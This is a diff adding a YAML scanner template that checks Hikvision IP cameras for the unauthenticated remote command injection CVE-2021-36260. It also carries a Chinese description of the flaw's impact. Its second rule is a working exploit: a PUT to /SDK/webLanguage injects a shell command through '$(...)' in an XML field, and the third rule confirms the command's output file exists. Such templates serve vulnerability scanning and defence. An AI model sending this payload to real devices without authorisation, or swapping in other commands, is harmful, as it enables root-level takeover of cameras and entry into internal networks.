@@ -1,0 +1,35 @@
+name: Hikvision RCE CVE-2021-36260
+manual: true
+query: app="Hikvision-Cameras-and-Surveillance"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /
+    expression: response.status == 200
+  r1:
+    request:
+      method: PUT
+      path: /SDK/webLanguage
+      headers:
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        X-Requested-With: XMLHttpRequest
+      body: |-
+        <?xml version="1.0" encoding="UTF-8"?>
+        <language>$(ls -l >webLib/c)</language>
+    expression: response.status == 500
+  r2:
+    request:
+      method: GET
+      path: /c
+    expression: response.status == 200
+expression: r0() && r1() && r2()
+detail:
+  author: aetkrad
+  links:
+  - https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html
+  description: |-
+    攻击者利用该漏洞可以用无限制的root shell来完全控制设备，即使设备的所有者受限于有限的受保护shell（psh）。除了入侵IP摄像头外，还可以访问和攻击内部网络。
+    该漏洞的利用并不需要用户交互，攻击者只需要访问http或HTTPS服务器端口（80/443）即可利用该漏洞，无需用户名、密码、以及其他操作。摄像头本身也不会检测到任何登录信息。
+  tags: rce
